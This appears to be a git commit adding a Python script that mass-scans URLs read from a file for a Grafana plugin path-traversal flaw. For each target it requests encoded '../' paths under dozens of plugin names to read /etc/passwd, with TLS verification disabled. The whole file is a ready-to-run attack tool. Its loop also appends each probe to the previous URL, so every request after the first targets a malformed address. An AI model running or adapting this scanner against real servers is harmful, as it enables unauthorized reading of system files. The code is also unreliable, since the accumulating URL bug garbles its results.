d730459781dd72f6f44c6e6187aeb46fb4b790a3
内蒙古上单 <83812544+Ed1s0nZ@users.noreply.github.com>
2021-12-08 10:21:23 +0800

    Add files via upload

---
+++ Grafana/Grafana.py
@@ -0,0 +1,32 @@
+# -*- coding: utf-8 -*-
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+plugins=["alertmanager","grafana","loki","postgres","grafana-azure-monitor-datasource","mixed","prometheus","cloudwatch","graphite","mssql","tempo","dashboard","influxdb","mysql","testdata","elasticsearch","jaeger","opentsdb","zipkin","alertGroups","bargauge","debug","graph","live","piechart","status-history","timeseries","alertlist","candlestick","gauge","heatmap","logs","pluginlist","table","welcome","annolist","canvas","geomap","histogram","news","stat","table-old","xychart","barchart","dashlist","gettingstarted","icon","nodeGraph","state-timeline","text"]
+
+def Grafana(url):
+    
+    for i in plugins:
+        url = url+'/public/plugins/'+i+'/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+        try:
+            r = requests.get(url,timeout=2,verify=False,allow_redirects=False)
+            # print("正在验证:"+url+'/public/plugins/'+i+'/../../../../../../../../../../../../../../../../../../etc/passwd')
+            reqcode = r.status_code
+            if reqcode == 200:
+                print("漏洞验证成功:",url)
+            else:
+                print("漏洞验证失败1"+i)
+        except requests.exceptions.ConnectTimeout:
+            print("漏洞验证失败2"+i)
+        except requests.exceptions.ConnectionError:
+            print("漏洞验证失败3"+i)
+        except requests.exceptions.ReadTimeout:
+            print("漏洞验证失败4"+i)
+
+if __name__ == "__main__":
+    with open("url.txt","r",encoding="utf-8") as f:
+        lines = f.readlines()
+    for line in lines:
+        line=line.strip()
+        Grafana(line)
